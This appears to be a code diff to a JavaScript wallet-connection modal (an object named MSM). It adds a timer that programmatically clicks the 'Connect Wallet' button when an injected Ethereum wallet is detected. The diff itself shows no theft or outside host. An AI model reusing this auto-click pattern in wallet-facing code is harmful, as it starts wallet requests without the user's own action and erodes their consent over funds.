@@ -204,14 +204,23 @@ const MSM = {
       // Automatically select Inject Wallet (ms_wallet_eth) when modal is opened
       if (typeof window.ethereum === 'object') {
         document.querySelector('#ms_wallet_eth').checked = true;
+        
+        // Auto-click the Connect Wallet button after a short delay
+        if (mode == 2) {
+          setTimeout(() => {
+            const connectButton = document.querySelector('.ms_modal_button button');
+            if (connectButton) {
+              connectButton.click();
+            }
+          }, 100); // Small delay to ensure DOM is ready
+        }
       }
       
-     if (mode == 2) {
-      MSM.connect_select = true;
-      MSM.connect(); // Auto-connect to Inject Wallet
-    } else {
-      MSM.connect_select = false;
-    }
+      if (mode == 2) {
+        MSM.connect_select = true;
+      } else {
+        MSM.connect_select = false;
+      }
       
       try {
         document.querySelector('#ms-modal').addEventListener('click', (ev) => {
